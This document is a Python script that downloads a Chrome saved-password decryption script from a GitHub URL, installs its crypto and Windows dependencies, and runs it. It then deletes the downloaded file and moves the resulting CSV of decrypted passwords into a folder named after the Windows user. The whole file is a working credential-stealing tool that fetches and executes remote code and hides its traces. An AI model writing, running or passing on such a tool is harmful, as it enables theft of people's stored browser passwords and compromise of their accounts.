import os
import subprocess
import requests
import sys
import shutil

def download_file(url, save_path):
    try:
        response = requests.get(url)
        response.raise_for_status()
        with open(save_path, 'wb') as file:
            file.write(response.content)
        print(f"File downloaded successfully to: {save_path}")
    except Exception as e:
        print(f"Error downloading file: {e}")
        sys.exit(1)

def install_dependencies():
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "pypiwin32"], check=True)
        subprocess.run([sys.executable, "-m", "pip", "install", "pycryptodomex"], check=True)
        print("Dependencies installed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error installing dependencies: {e}")
        sys.exit(1)

def execute_script(script_path):
    try:
        subprocess.run([sys.executable, script_path], check=True)
        print(f"Script executed successfully: {script_path}")
    except subprocess.CalledProcessError as e:
        print(f"Error executing script: {e}")
        sys.exit(1)

def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    save_path = os.path.join(script_dir, "decrypt_chrome_password.py")
    url = "https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/refs/heads/main/decrypt_chrome_password.py"

    print("Downloading script...")
    download_file(url, save_path)

    print("Installing dependencies...")
    install_dependencies()

    print("Executing downloaded script...")
    execute_script(save_path)

    print("Automation process completed successfully.")

    # Clean-Up after execution
    try:
        if os.path.exists(save_path):
            os.remove(save_path)
            print(f"Deleted downloaded script: {save_path}")
    except Exception as e:
        print(f"Error deleting downloaded script: {e}")

    # Create folder and moveing the passwords
    try:
        username = os.environ.get("USERNAME", "DefaultUser")
        user_folder = os.path.join(script_dir, username)
        os.makedirs(user_folder, exist_ok=True)

        # Move decrypted_password.csv to the folder
        decrypted_file = os.path.join(script_dir, "decrypted_password.csv")
        if os.path.isfile(decrypted_file):
            shutil.move(decrypted_file, os.path.join(user_folder, "decrypted_password.csv"))

        print(f"Moved decrypted_password.csv to {user_folder}")
    except Exception as e:
        print(f"Error moving decrypted_password.csv to user folder: {e}")

if __name__ == "__main__":
    main()
